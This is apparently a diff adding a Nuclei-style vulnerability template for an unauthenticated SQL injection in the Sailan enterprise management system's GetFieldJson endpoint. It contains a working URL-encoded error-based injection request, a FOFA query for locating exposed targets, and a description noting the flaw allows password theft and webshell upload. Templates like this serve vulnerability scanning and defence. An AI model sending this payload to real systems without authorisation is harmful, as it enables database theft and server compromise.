@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 转换成数据类型 int 时失败
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /BaseModule/ExcelImport/GetFieldJson?tableCode=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20@@VERSION%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq HTTP/1.1
+          Host: {{Hostname}}
+id: sailan-GetFieldJson-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/Home6/AdminPretty"
+        赛蓝企业管理系统 GetFieldJson 接口处SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 赛蓝企业管理系统 GetFieldJson SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486110&idx=1&sn=6327aee7d91a6424192b455311fe6150&chksm=c267bfadf51036bb80935247f6517003a1b81da60adfee957785598ab81c3878bcd9d708f840&token=803667191&lang=zh_CN#rd
+    severity: high
+    tags:
+        - 赛蓝企业管理系统
